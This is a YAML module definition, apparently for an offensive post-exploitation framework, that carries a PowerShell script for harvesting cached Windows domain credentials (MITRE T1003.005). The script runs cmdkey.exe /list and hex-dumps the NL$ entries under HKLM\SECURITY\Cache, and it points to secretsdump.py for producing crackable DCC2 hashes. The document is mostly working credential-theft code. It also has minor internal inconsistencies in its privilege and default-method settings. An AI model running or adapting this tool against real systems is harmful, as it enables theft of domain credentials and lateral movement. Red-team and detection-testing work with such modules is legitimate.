name: Get-CachedDomainCredentials
authors:
  - name: Anthony Rose
    handle: '@Cx01N'
    link: https://twitter.com/Cx01N_
description: |
  Extracts cached domain credentials from the local system. Windows
  caches domain logon information so users can log in even when a
  domain controller is unavailable. The cached credential blobs (which
  contain the DCC2/mscachev2 hashes once parsed) are stored in the
  registry under HKLM\Security\Cache, which is only readable by the
  SYSTEM account.

  The module supports two methods:
    cmdkey   - enumerates stored credentials via the built-in cmdkey.exe
               utility. No admin required.
    registry - hex-dumps the raw NL$ entries from HKLM\SECURITY\Cache.
               Requires SYSTEM (not just admin) on modern Windows.
               Output is a hex dump of the first 64 bytes of each
               entry plus a parsed username; it is NOT a ready-to-crack
               $DCC2$ hash string.

  Default method is cmdkey since it works under any user context.
software: ''
tactics: [TA0006]
techniques: [T1003.005]
background: false
output_extension:
needs_admin: true
opsec_safe: true
language: powershell
min_language_version: '2'
comments:
  - https://github.com/redcanaryco/atomic-red-team
options:
  - name: Method
    description: >-
      Credential extraction method. cmdkey uses the built-in cmdkey.exe and works
      under any user context. registry reads cached logon blobs from HKLM\SECURITY\Cache
      and requires SYSTEM privileges. all runs both.
    required: true
    value: 'cmdkey'
    strict: true
    suggested_values:
      - cmdkey
      - registry
      - all
  - name: OutputFunction
    description: PowerShell output function to use.
    required: false
    value: 'Out-String'
    suggested_values:
      - Out-String
      - ConvertTo-Json
script: |
  function Get-CachedDomainCredentials {
      param(
          [string]$Method = "all"
      )

      "[*] Cached Domain Credential Extraction"
      "[*] Method: $Method"
      ""

      function Get-CmdkeyCredentials {
          "[*] === cmdkey /list output ==="
          ""
          $output = cmdkey.exe /list 2>&1
          if ($output) {
              $output | ForEach-Object { $_ }
          } else {
              "[*] No stored credentials found via cmdkey"
          }
          ""
      }

      function Get-RegistryCachedCreds {
          "[*] === Registry Cached Credentials ==="
          ""

          $cachePath = "HKLM:\SECURITY\Cache"
          try {
              $cacheData = Get-ItemProperty -Path $cachePath -ErrorAction Stop
          } catch [System.Security.SecurityException], [System.UnauthorizedAccessException], [System.Management.Automation.ItemNotFoundException] {
              "[!] Cannot read HKLM:\SECURITY\Cache: $_"
              "[*] This typically requires SYSTEM privileges"
              "[*] Try running from a SYSTEM-level agent or use the cmdkey method"
              ""
              return
          }

          # NL$Control contains the cache iteration count
          $iterCount = $cacheData.'NL$Control'
          if ($iterCount) {
              $iterCountHex = ($iterCount | ForEach-Object { $_.ToString("X2") }) -join " "
              "[*] NL`$Control (iteration count): $iterCountHex"
          }

          # Enumerate NL$1 through NL$N cached entries and hex-dump the first 64
          # bytes of each non-empty slot. We intentionally do NOT parse the
          # MSCACHE_V2 header here -- offsets differ between Win2K (V1) and
          # Vista+ (V2), and the hash material is encrypted with NL$KM. To
          # produce hashcat-ready $DCC2$ strings, use secretsdump.py.
          $entryCount = 0
          for ($i = 1; $i -le 64; $i++) {
              $entryName = "NL`$$i"
              $entryData = $cacheData.$entryName
              if (-not $entryData -or $entryData.Length -eq 0) { continue }

              # Skip all-zero entries
              $nonZero = $false
              foreach ($b in $entryData) {
                  if ($b -ne 0) { $nonZero = $true; break }
              }
              if (-not $nonZero) { continue }

              $entryCount++
              $hexData = ($entryData[0..63] | ForEach-Object { $_.ToString("X2") }) -join " "
              "[+] $entryName (first 64 bytes): $hexData"
          }

          if ($entryCount -eq 0) {
              "[*] No cached domain logon entries found"
          } else {
              ""
              "[+] Found $entryCount cached credential entries (hex dumps above)"
              "[*] Note: this is a raw hex dump of the NL`$ entries, not a"
              "[*] hashcat-ready \$DCC2\$ string. Use impacket secretsdump.py"
              "[*] against a SYSTEM-level registry export for that."
          }
          ""
      }

      if ($Method -eq "cmdkey" -or $Method -eq "all") {
          Get-CmdkeyCredentials
      }

      if ($Method -eq "registry" -or $Method -eq "all") {
          Get-RegistryCachedCreds
      }

      "[*] Cached domain credential extraction complete"
  }
script_end: Get-CachedDomainCredentials {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
